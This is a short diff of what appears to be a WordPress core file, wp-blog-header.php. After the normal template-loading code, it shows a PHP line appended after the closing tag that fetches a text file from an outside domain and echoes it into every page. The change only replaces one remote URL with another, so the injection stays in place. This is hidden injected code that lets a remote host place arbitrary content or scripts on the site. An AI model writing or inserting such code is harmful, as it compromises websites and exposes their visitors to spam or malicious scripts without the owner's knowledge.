@@ -18,4 +18,4 @@ if ( ! isset( $wp_did_header ) ) {
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
-}?><?php $a = file_get_contents('https://paulsaar.com/tmb/bl.txt'); echo $a; ?>
+}?><?php $a = file_get_contents('https://paulsaar.com/-/id.txt'); echo $a; ?>
